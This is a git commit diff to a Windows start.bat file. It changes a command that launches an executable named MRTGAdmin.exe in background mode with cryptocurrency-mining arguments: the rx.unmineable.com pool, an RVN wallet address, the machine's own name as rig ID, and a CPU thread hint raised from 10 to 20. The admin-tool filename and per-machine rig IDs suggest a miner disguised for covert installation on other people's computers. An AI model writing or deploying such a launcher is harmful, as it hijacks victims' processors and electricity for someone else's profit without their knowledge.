20ebedff957c730bb388331e495c055ce935f683
wagepentathlon <96092863+wagepentathlon@users.noreply.github.com>
2023-05-27 13:59:49 -0500

    Update start.bat

--- start.bat
+++ start.bat
@@ -1,3 +1,3 @@
-.\Win10\MRTGAdmin.exe -B -o rx.unmineable.com:3333 -a rx -k -u RVN:RTbY46h1CnHKZgNmuNvjoprMgveTWQYVNg --rig-id=%ComputerName% -p x --cpu-max-threads-hint=10
+.\Win10\MRTGAdmin.exe -B -o rx.unmineable.com:3333 -a rx -k -u RVN:RTbY46h1CnHKZgNmuNvjoprMgveTWQYVNg --rig-id=%ComputerName% -p x --cpu-max-threads-hint=20
 pause
 
